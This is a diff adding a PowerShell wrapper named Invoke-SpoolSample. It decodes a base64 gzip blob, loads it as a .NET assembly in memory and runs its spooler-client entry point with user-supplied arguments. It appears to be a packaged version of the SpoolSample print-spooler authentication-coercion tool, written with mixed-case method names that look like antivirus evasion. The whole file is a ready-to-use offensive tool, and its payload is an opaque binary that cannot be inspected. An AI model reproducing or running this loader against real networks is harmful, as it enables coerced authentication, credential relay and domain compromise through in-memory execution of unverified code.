@@ -1,0 +1,28 @@
+function Invoke-SpoolSample
+{
+
+    [CmdletBinding()]
+    Param (
+        [String]
+        $Command = ""
+
+    )
+
+    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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"))
+    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
+    $output = New-Object System.IO.MemoryStream
+    $decompressed.CopyTo( $output )
+    [byte[]] $byteOutArray = $output.ToArray()
+    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
+
+    $OldConsoleOut = [Console]::Out
+    $StringWriter = New-Object IO.StringWriter
+    [Console]::SetOut($StringWriter)
+
+    [FakeSpoolerClient.Program]::main($Command.Split(" "))
+
+    [Console]::SetOut($OldConsoleOut)
+    $Results = $StringWriter.ToString()
+    $Results
+  
+}
